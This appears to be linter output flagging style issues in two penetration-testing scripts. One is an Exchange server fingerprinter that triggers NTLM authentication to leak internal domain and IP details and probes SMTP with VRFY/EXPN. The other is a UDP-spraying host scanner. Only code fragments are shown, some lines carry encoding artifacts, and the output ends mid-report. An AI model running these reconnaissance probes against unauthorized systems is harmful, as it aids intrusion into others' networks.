    |     ^^^^^^^^^^^^^^^^
368 |     leakedInternalDomainNTLM = "Leaked Internal Domain name in NTLM challenge packet"
369 |     iisVersion = "IIS Version"
    |

N815 Variable `leakedInternalDomainNTLM` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:368:5
    |
367 |     leakedInternalIp = "Leaked Internal IP address"
368 |     leakedInternalDomainNTLM = "Leaked Internal Domain name in NTLM challenge packet"
    |     ^^^^^^^^^^^^^^^^^^^^^^^^
369 |     iisVersion = "IIS Version"
370 |     aspVersion = "ASP.Net Version"
    |

N815 Variable `iisVersion` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:369:5
    |
367 |     leakedInternalIp = "Leaked Internal IP address"
368 |     leakedInternalDomainNTLM = "Leaked Internal Domain name in NTLM challenge packet"
369 |     iisVersion = "IIS Version"
    |     ^^^^^^^^^^
370 |     aspVersion = "ASP.Net Version"
371 |     unusualHeaders = "Unusual HTTP headers observed"
    |

N815 Variable `aspVersion` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:370:5
    |
368 |     leakedInternalDomainNTLM = "Leaked Internal Domain name in NTLM challenge packet"
369 |     iisVersion = "IIS Version"
370 |     aspVersion = "ASP.Net Version"
    |     ^^^^^^^^^^
371 |     unusualHeaders = "Unusual HTTP headers observed"
372 |     owaVersionInHttpHeader = "Outlook Web App version HTTP header"
    |

N815 Variable `unusualHeaders` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:371:5
    |
369 |     iisVersion = "IIS Version"
370 |     aspVersion = "ASP.Net Version"
371 |     unusualHeaders = "Unusual HTTP headers observed"
    |     ^^^^^^^^^^^^^^
372 |     owaVersionInHttpHeader = "Outlook Web App version HTTP header"
373 |     legacyMailCapabilities = "Exchange supports legacy SMTP and returned following banner/unusual capabilities"
    |

N815 Variable `owaVersionInHttpHeader` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:372:5
    |
370 |     aspVersion = "ASP.Net Version"
371 |     unusualHeaders = "Unusual HTTP headers observed"
372 |     owaVersionInHttpHeader = "Outlook Web App version HTTP header"
    |     ^^^^^^^^^^^^^^^^^^^^^^
373 |     legacyMailCapabilities = "Exchange supports legacy SMTP and returned following banner/unusual capabilities"
    |

N815 Variable `legacyMailCapabilities` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:373:5
    |
371 |     unusualHeaders = "Unusual HTTP headers observed"
372 |     owaVersionInHttpHeader = "Outlook Web App version HTTP header"
373 |     legacyMailCapabilities = "Exchange supports legacy SMTP and returned following banner/unusual capabilities"
    |     ^^^^^^^^^^^^^^^^^^^^^^
374 |
375 |     usualHeaders = {
    |

N815 Variable `usualHeaders` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:375:5
    |
373 |     legacyMailCapabilities = "Exchange supports legacy SMTP and returned following banner/unusual capabilities"
374 |
375 |     usualHeaders = {
    |     ^^^^^^^^^^^^
376 |         "accept-ranges",
377 |         "access-control-allow-origin",
    |

UP004 [*] Class `Verstring` inherits from `object`
   --> security\penetration-testing-tools\networks\exchangeRecon.py:414:21
    |
412 |     }
413 |
414 |     class Verstring(object):
    |                     ^^^^^^
415 |         def __init__(self, name, date, *versions):
416 |             self.name = name
    |
help: Remove `object` inheritance

F821 Undefined name `Verstring`
   --> security\penetration-testing-tools\networks\exchangeRecon.py:421:34
    |
420 |         def __eq__(self, other):
421 |             if isinstance(other, Verstring):
    |                                  ^^^^^^^^^
422 |                 return (
423 |                     packaging.version.parse(self.version)
    |

N815 Variable `exchangeVersions` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\exchangeRecon.py:441:5
    |
440 |     # https://docs.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019
441 |     exchangeVersions = (
    |     ^^^^^^^^^^^^^^^^
442 |         Verstring("Exchange Server 4.0 SP5 ", "May 5, 1998", "4.0.996"),
443 |         Verstring("Exchange Server 4.0 SP4 ", "March 28, 1997", "4.0.995"),
    |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1272:27
     |
1271 |     def disconnect(self):
1272 |         if self.socket != None:
     |                           ^^^^
1273 |             self.socket.close()
1274 |             self.socket = None
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1280:35
     |
1278 |             Logger.dbg(f"Attempting to reach {host}:{port}...")
1279 |             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
1280 |                 if self.socket != None:
     |                                   ^^^^
1281 |                     self.socket.close()
1282 |                     self.socket = None
     |
help: Replace with `cond is not None`

UP041 [*] Replace aliased errors with `TimeoutError`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1326:16
     |
1324 |                 return True
1325 |
1326 |         except (socket.gaierror, socket.timeout, ConnectionResetError) as e:
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1327 |             Logger.dbg(f"Failed.: {e}")
1328 |         return False
     |
help: Replace with builtin `TimeoutError`

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1341:13
     |
1340 |           while 1:
1341 | /             if total_data and time.time() - begin > timeout:
1342 | |                 break
1343 | |
1344 | |             elif time.time() - begin > timeout * 2:
1345 | |                 break
     | |_____________________^
1346 |               wait = 0
1347 |               try:
     |
help: Combine `if` branches

F841 Local variable `wait` is assigned to but never used
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1353:21
     |
1351 |                     begin = time.time()
1352 |                     data = ""
1353 |                     wait = 0
     |                     ^^^^
1354 |                 else:
1355 |                     time.sleep(0.1)
     |
help: Remove assignment to unused variable `wait`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1356:13
     |
1354 |                 else:
1355 |                     time.sleep(0.1)
1356 |             except:
     |             ^^^^^^
1357 |                 pass
     |

N803 Argument name `dontReconnect` should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1362:26
     |
1360 |         return result
1361 |
1362 |     def send(self, data, dontReconnect=False):
     |                          ^^^^^^^^^^^^^^^^^^^
1363 |         Logger.dbg(f"================= [SEND] =================\n{data}\n")
     |

N803 Argument name `followRedirect` should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1405:9
     |
1403 |         data=None,
1404 |         headers=None,
1405 |         followRedirect=False,
     |         ^^^^^^^^^^^^^^^^^^^^
1406 |         redirect=0,
1407 |     ):
     |

SIM108 Use ternary operator `data = f"\r\n{data}" if data else ""` instead of `if`-`else`-block
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1419:9
     |
1417 |               headersstr += f"{k}: {v}\r\n"
1418 |
1419 | /         if data:
1420 | |             data = f"\r\n{data}"
1421 | |         else:
1422 | |             data = ""
     | |_____________________^
1423 |
1424 |           packet = f"{method} {url} {httpver}\r\n{headersstr}{data}\r\n\r\n"
     |
help: Replace `if`-`else`-block with `data = f"\r\n{data}" if data else ""`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1431:16
     |
1429 |             Logger.dbg(f"Following redirect. Depth: {redirect}...")
1430 |
1431 |             if "location" in resp["headers"].keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1432 |                 location = urlparse(resp["headers"]["location"])
1433 |                 port = 80 if location.scheme == "http" else 443
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1481:16
     |
1479 |             val = line[pos + 1 :].strip()
1480 |
1481 |             if name in resp["headers"].keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1482 |                 if isinstance(resp["headers"][name], str):
1483 |                     old = resp["headers"][name]
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1501:13
     |
1500 |         if (
1501 |             "content-length" in resp["headers"].keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1502 |             and len(resp["data"]) != resp["headers"]["content-length"]
1503 |         ):
     |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1530:24
     |
1528 |                 ver = ExchangeRecon.parseVersion(v)
1529 |                 if ver:
1530 |                     if ExchangeRecon.owaVersionInHttpHeader not in self.results.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1531 |                         self.results[ExchangeRecon.owaVersionInHttpHeader] = ""
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1535:26
     |
1533 |                     self.results[
1534 |                         ExchangeRecon.owaVersionInHttpHeader
1535 |                     ] += "\n\t({})".format(str(ver))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1536 |
1537 |             elif kl == "www-authenticate":
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1562:29
     |
1560 |                             try:
1561 |                                 foo += f"\t{k2}:\n\t\t{v2}\n"
1562 |                             except:
     |                             ^^^^^^
1563 |                                 pass
1564 |                         elif isinstance(v2, dict):
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1571:33
     |
1569 |                                 try:
1570 |                                     foo += f"\t\t{k3: <18}:\t{v3}\n"
1571 |                                 except:
     |                                 ^^^^^^
1572 |                                     pass
1573 |                         elif isinstance(v2, list):
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1576:29
     |
1574 |                             try:
1575 |                                 foo += f"\t{k2}:\n\t\t- " + "\n\t\t- ".join(v2) + "\n"
1576 |                             except:
     |                             ^^^^^^
1577 |                                 pass
1578 |                     self.results[ExchangeRecon.leakedInternalDomainNTLM] = foo[1:]
     |

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1587:17
     |
1586 |             if kl not in ExchangeRecon.usualHeaders:
1587 |                 l = f"{k}: {v}"
     |                 ^
1588 |                 if (
1589 |                     ExchangeRecon.unusualHeaders not in self.results.keys()
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1589:21
     |
1587 |                 l = f"{k}: {v}"
1588 |                 if (
1589 |                     ExchangeRecon.unusualHeaders not in self.results.keys()
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1590 |                     or l not in self.results[ExchangeRecon.unusualHeaders]
1591 |                 ):
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1604:47
     |
1602 |                     ver = ExchangeRecon.parseVersion(m.group(1))
1603 |                     if ver:
1604 |                         self.results[name] += "\n\t({})".format(str(ver))
     |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1605 |
1606 |     @staticmethod
     |
help: Convert to f-string

F841 Local variable `prevver` is assigned to but never used
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1628:17
     |
1626 |             nextver = packaging.version.parse("99999.0")
1627 |             if i > 0:
1628 |                 prevver = packaging.version.parse(sortedversions[i - 1].version)
     |                 ^^^^^^^
1629 |             thisver = packaging.version.parse(sortedversions[i].version)
1630 |             if i + 1 < len(sortedversions):
     |
help: Remove assignment to unused variable `prevver`

N806 Variable `verificationPaths` in function should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1641:9
     |
1639 |     def verifyExchange(self):
1640 |         # Fetching these paths as unauthorized must result in 401
1641 |         verificationPaths = (
     |         ^^^^^^^^^^^^^^^^^
1642 |             # (path, redirect, sendHostHeader /* HTTP/1.1 */)
1643 |             ("/owa", True, True),
     |

N806 Variable `definitiveMarks` in function should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1650:9
     |
1648 |         )
1649 |
1650 |         definitiveMarks = (
     |         ^^^^^^^^^^^^^^^
1651 |             "<title>Outlook Web App</title>",
1652 |             "<!-- OwaPage = ASP.auth_logon_aspx -->",
     |

N806 Variable `otherMarks` in function should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1661:9
     |
1659 |         )
1660 |
1661 |         otherMarks = (
     |         ^^^^^^^^^^
1662 |             "Location: /owa/",
1663 |             "Microsoft-IIS/",
     |

N806 Variable `sendHostHeader` in function should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1672:29
     |
1670 |         definitive = False
1671 |
1672 |         for path, redirect, sendHostHeader in verificationPaths:
     |                             ^^^^^^^^^^^^^^
1673 |             if not sendHostHeader:
1674 |                 resp, raw = self.http(
     |

N806 Variable `verificationPaths` in function should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1718:9
     |
1717 |     def tryToTriggerNtlmAuthentication(self):
1718 |         verificationPaths = ("/autodiscover/autodiscover.xml",)
     |         ^^^^^^^^^^^^^^^^^
1719 |
1720 |         for path in verificationPaths:
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1854:13
     |
1852 |                 server.starttls()
1853 |                 server.ehlo()
1854 |             except:
     |             ^^^^^^
1855 |                 pass
1856 |             msg = server.help()
     |

N806 Variable `skipThese` in function should be lowercase
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1862:9
     |
1860 |             capabilities.append(line.strip())
1861 |
1862 |         skipThese = (
     |         ^^^^^^^^^
1863 |             "8BITMIME",
1864 |             "STARTTLS",
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1901:9
     |
1899 |         try:
1900 |             server.quit()
1901 |         except:
     |         ^^^^^^
1902 |             pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1915:13
     |
1913 |                 server.starttls()
1914 |                 server.ehlo()
1915 |             except:
     |             ^^^^^^
1916 |                 pass
1917 |             return server
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1924:14
     |
1922 |             return None
1923 |
1924 |         ip = "[{}]".format(socket.gethostbyname(self.hostname))
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1925 |         if found_dns_domain:
1926 |             ip = found_dns_domain
     |
help: Convert to f-string

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1929:13
     |
1928 |         techniques = {
1929 |             f"VRFY root": None,
     |             ^^^^^^^^^^^^
1930 |             f"EXPN root": None,
1931 |             f"MAIL FROM:<test@{ip}>": None,
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1930:13
     |
1928 |         techniques = {
1929 |             f"VRFY root": None,
1930 |             f"EXPN root": None,
     |             ^^^^^^^^^^^^
1931 |             f"MAIL FROM:<test@{ip}>": None,
1932 |             f"RCPT TO:<test@{ip}>": None,
     |
help: Remove extraneous `f` prefix

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1938:13
     |
1937 |         likely = 0
1938 |         for data in techniques.keys():
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^
1939 |             for i in range(3):
1940 |                 try:
     |
help: Remove `.keys()`

B007 Loop control variable `i` not used within loop body
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1939:17
     |
1937 |         likely = 0
1938 |         for data in techniques.keys():
1939 |             for i in range(3):
     |                 ^
1940 |                 try:
1941 |                     code, msg = server.docmd(data)
     |
help: Rename unused `i` to `_i`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\exchangeRecon.py:1983:9
     |
1982 |       print(
1983 | /         """
1984 | |         :: Exchange Fingerprinter
1985 | |         Tries to obtain internal IP address, Domain name and other clues by talking to Exchange
1986 | |         Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
1987 | |         v{}
1988 | | """.format(
1989 | |             VERSION
1990 | |         )
     | |_________^
1991 |       )
     |
help: Convert to f-string

E713 [*] Test for membership should be `not in`
    --> security\penetration-testing-tools\networks\exchangeRecon.py:2012:12
     |
2010 |     args = parser.parse_args()
2011 |
2012 |     if not "hostname" in args:
     |            ^^^^^^^^^^^^^^^^^^
2013 |         Logger.err("You must specify a hostname to launch!")
2014 |         return False
     |
help: Convert to `not in`

SIM101 Multiple `isinstance` calls for `v`, merge into a single call
    --> security\penetration-testing-tools\networks\exchangeRecon.py:2031:14
     |
2029 |         if isinstance(v, str):
2030 |             print(f"*) {k}:\n\t{v.strip()}\n")
2031 |         elif isinstance(v, list) or isinstance(v, set):
     |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2032 |             v2 = "\n\t- ".join(v)
2033 |             print(f"*) {k}:\n\t- {v2}\n")
     |
help: Merge `isinstance` calls for `v`

N803 Argument name `sockBuff` should be lowercase
  --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:45:23
   |
43 |     ]
44 |
45 |     def __new__(self, sockBuff = None):
   |                       ^^^^^^^^^^^^^^^
46 |         return self.from_buffer_copy(sockBuff)
   |

N803 Argument name `sockBuff` should be lowercase
  --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:48:24
   |
46 |         return self.from_buffer_copy(sockBuff)
47 |
48 |     def __init__(self, sockBuff = None):
   |                        ^^^^^^^^^^^^^^^
49 |         self.types_map = {
50 |             0:'Echo Reply',1:'Unassigned',2:'Unassigned ',3:'Destination Unreachable',
   |

E722 Do not use bare `except`
  --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:64:9
   |
62 |         try:
63 |             self.message = self.types_map[self.type]
64 |         except:
   |         ^^^^^^
65 |             self.message = str('')
   |

UP018 [*] Unnecessary `str` call (rewrite as a literal)
  --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:65:28
   |
63 |             self.message = self.types_map[self.type]
64 |         except:
65 |             self.message = str('')
   |                            ^^^^^^^
66 |
67 | #
   |
help: Replace with string literal

N803 Argument name `socketBuffer` should be lowercase
  --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:85:23
   |
83 |     ]
84 |
85 |     def __new__(self, socketBuffer = None):
   |                       ^^^^^^^^^^^^^^^^^^^
86 |         return self.from_buffer_copy(socketBuffer)
   |

N803 Argument name `socketBuffer` should be lowercase
  --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:88:24
   |
86 |         return self.from_buffer_copy(socketBuffer)
87 |
88 |     def __init__(self, socketBuffer = None):
   |                        ^^^^^^^^^^^^^^^^^^^
89 |         # Map protocol constants to their names.
90 |         self.protocol_map = {
   |

F601 Dictionary key literal `84` repeated
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:101:60
    |
 99 |             65:'KRYPTOLAN',66:'RVD',67:'IPPC',69:'SAT-MON',70:'VISA',71:'IPCV',72:'CPNX',
100 |             73:'CPHB',74:'WSN',75:'PVP',76:'BR-SAT-MON',77:'SUN-ND',78:'WB-MON',79:'WB-EXPAK',80:'ISO-IP',
101 |             81:'VMTP',82:'SECURE-VMTP',83:'VINES',84:'TTP',84:'IPTM',85:'NSFNET-IGP',86:'DGP',87:'TCF',88:'EIGRP',
    |                                                            ^^
102 |             89:'OSPFIGP',90:'Sprite-RPC',91:'LARP',92:'MTP',93:'AX.25',94:'IPIP',95:'MICP',96:'SCC-SP',
103 |             97:'ETHERIP',98:'ENCAP',100:'GMTP',101:'IFMP',102:'PNNI',103:'PIM',104:'ARIS',
    |
help: Remove repeated key literal `84`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:114:9
    |
112 |         try:
113 |             self.src_address = socket.inet_ntoa(struct.pack('<L', self.src))
114 |         except:
    |         ^^^^^^
115 |             print('[!] Could not represent incoming packet\'s source address: {}'.format(self.src))
116 |             self.src_address = '127.0.0.1'
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:115:19
    |
113 |             self.src_address = socket.inet_ntoa(struct.pack('<L', self.src))
114 |         except:
115 |             print('[!] Could not represent incoming packet\'s source address: {}'.format(self.src))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
116 |             self.src_address = '127.0.0.1'
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:120:9
    |
118 |         try:
119 |             self.dst_address = socket.inet_ntoa(struct.pack('<L', self.dst))
120 |         except:
    |         ^^^^^^
121 |             print('[!] Could not represent incoming packet\'s destination address: {}'.format(self.dst))
122 |             self.dst_address = '127.0.0.1'
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:121:19
    |
119 |             self.dst_address = socket.inet_ntoa(struct.pack('<L', self.dst))
120 |         except:
121 |             print('[!] Could not represent incoming packet\'s destination address: {}'.format(self.dst))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
122 |             self.dst_address = '127.0.0.1'
    |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:127:9
    |
125 |         try:
126 |             self.protocol = self.protocol_map[self.protocol_num]
127 |         except:
    |         ^^^^^^
128 |             self.protocol = str(self.protocol_num)
    |

W291 [*] Trailing whitespace
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:133:14
    |
131 | def udpSend(subnet, message):
132 |     time.sleep(5)
133 |     if DEBUG: 
    |              ^
134 |         print('[.] Started spraying UDP packets across {}'.format(str(subnet)))
    |
help: Remove trailing whitespace

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:134:15
    |
132 |     time.sleep(5)
133 |     if DEBUG: 
134 |         print('[.] Started spraying UDP packets across {}'.format(str(subnet)))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
135 |
136 |     packets = 0
    |
help: Convert to f-string

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:137:13
    |
136 |     packets = 0
137 |     ports = [x for x in SCAN_PORTS]
    |             ^^^^^^^^^^^^^^^^^^^^^^^
138 |     sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    |
help: Rewrite using `list()`

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:145:16
    |
143 |                 sender.sendto(message, (str(ip), port))
144 |                 packets += 1
145 |         except Exception, e:
    |                ^^^^^^^^^^^^
146 |             pass
    |

F821 Undefined name `e`
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:145:27
    |
143 |                 sender.sendto(message, (str(ip), port))
144 |                 packets += 1
145 |         except Exception, e:
    |                           ^
146 |             pass
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:148:11
    |
146 |               pass
147 |
148 |       print('[.] Spraying thread finished. Sent: {} packets on {} hosts.'.format(
    |  ___________^
149 | |         packets, len(IPNetwork(subnet))
150 | |     ))
    | |_____^
151 |
152 |   def processPackets(sniffer, subnet):
    |
help: Convert to f-string

N806 Variable `packetNum` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:157:9
    |
155 |     # Read in single packet
156 |     try:
157 |         packetNum = 0
    |         ^^^^^^^^^
158 |
159 |         while True:
    |

N806 Variable `packetPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:160:13
    |
159 |         while True:
160 |             packetPrint = ''
    |             ^^^^^^^^^^^
161 |             packetNum += 1
    |

N806 Variable `packetNum` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:161:13
    |
159 |         while True:
160 |             packetPrint = ''
161 |             packetNum += 1
    |             ^^^^^^^^^
162 |
163 |             packet = sniffer.recvfrom((1 << 16) - 1)[0]
    |

N806 Variable `ipHeader` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:166:13
    |
165 |             # Create an IP header from the first 20 bytes of the buffer.
166 |             ipHeader = IP(packet[0 : ctypes.sizeof(IP)])
    |             ^^^^^^^^
167 |
168 |             timeNow = datetime.now().strftime('%H:%M:%S.%f')[:-3]
    |

N806 Variable `timeNow` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:168:13
    |
166 |             ipHeader = IP(packet[0 : ctypes.sizeof(IP)])
167 |
168 |             timeNow = datetime.now().strftime('%H:%M:%S.%f')[:-3]
    |             ^^^^^^^
169 |
170 |             # Print out the protocol that was detected and the hosts.
    |

N806 Variable `packetPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:171:13
    |
170 |             # Print out the protocol that was detected and the hosts.
171 |             packetPrint += '[{:05} | {}] {} {} > {}'.format(
    |             ^^^^^^^^^^^
172 |                 packetNum, timeNow, ipHeader.protocol, ipHeader.src_address, ipHeader.dst_address,
173 |             )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:171:28
    |
170 |               # Print out the protocol that was detected and the hosts.
171 |               packetPrint += '[{:05} | {}] {} {} > {}'.format(
    |  ____________________________^
172 | |                 packetNum, timeNow, ipHeader.protocol, ipHeader.src_address, ipHeader.dst_address,
173 | |             )
    | |_____________^
174 |
175 |               if ipHeader.protocol == 'ICMP':
    |
help: Convert to f-string

N806 Variable `icmpBuf` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:177:17
    |
175 |             if ipHeader.protocol == 'ICMP':
176 |                 offset = ipHeader.ihl * 4
177 |                 icmpBuf = packet[offset : offset + ctypes.sizeof(ICMP)]
    |                 ^^^^^^^
178 |                 icmpHeader = ICMP(icmpBuf)
    |

N806 Variable `icmpHeader` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:178:17
    |
176 |                 offset = ipHeader.ihl * 4
177 |                 icmpBuf = packet[offset : offset + ctypes.sizeof(ICMP)]
178 |                 icmpHeader = ICMP(icmpBuf)
    |                 ^^^^^^^^^^
179 |
180 |                 packetPrint += ': ICMP Type: {} ({}), Code: {}\n'.format(
    |

N806 Variable `packetPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:180:17
    |
178 |                 icmpHeader = ICMP(icmpBuf)
179 |
180 |                 packetPrint += ': ICMP Type: {} ({}), Code: {}\n'.format(
    |                 ^^^^^^^^^^^
181 |                     icmpHeader.type, icmpHeader.message, icmpHeader.code
182 |                 )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:180:32
    |
178 |                   icmpHeader = ICMP(icmpBuf)
179 |
180 |                   packetPrint += ': ICMP Type: {} ({}), Code: {}\n'.format(
    |  ________________________________^
181 | |                     icmpHeader.type, icmpHeader.message, icmpHeader.code
182 | |                 )
    | |_________________^
183 |
184 |                   if DEBUG: 
    |
help: Convert to f-string

W291 [*] Trailing whitespace
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:184:26
    |
182 |                 )
183 |
184 |                 if DEBUG: 
    |                          ^
185 |                     packetPrint += hexdump(packet)
    |
help: Remove trailing whitespace

N806 Variable `packetPrint` in function should be lowercase
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:185:21
    |
184 |                 if DEBUG: 
185 |                     packetPrint += hexdump(packet)
    |                     ^^^^^^^^^^^
186 |
187 |                 # Destination unreachable
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:188:17
    |
187 |                   # Destination unreachable
188 | /                 if icmpHeader.code == 3 and icmpHeader.type == 3:
189 | |                     if IPAddress(ipHeader.src_address) in IPNetwork(subnet):
190 | |
191 | |                         # Make sure it contains our message
192 | |                         if packet[- len(MAGIC_MESSAGE):] == MAGIC_MESSAGE:
    | |__________________________________________________________________________^
193 |                               host = ipHeader.src_address
194 |                               if host not in HOSTS_UP:
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:189:21
    |
187 |                   # Destination unreachable
188 |                   if icmpHeader.code == 3 and icmpHeader.type == 3:
189 | /                     if IPAddress(ipHeader.src_address) in IPNetwork(subnet):
190 | |
191 | |                         # Make sure it contains our message
192 | |                         if packet[- len(MAGIC_MESSAGE):] == MAGIC_MESSAGE:
    | |__________________________________________________________________________^
193 |                               host = ipHeader.src_address
194 |                               if host not in HOSTS_UP:
    |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\host-scanner-via-udp.py:195:39
    |
193 | ΓÇª                     host = ipHeader.src_address
194 | ΓÇª                     if host not in HOSTS_UP:
195 | ΓÇª                         print('[+] HOST IS UP: {}'.format(host))
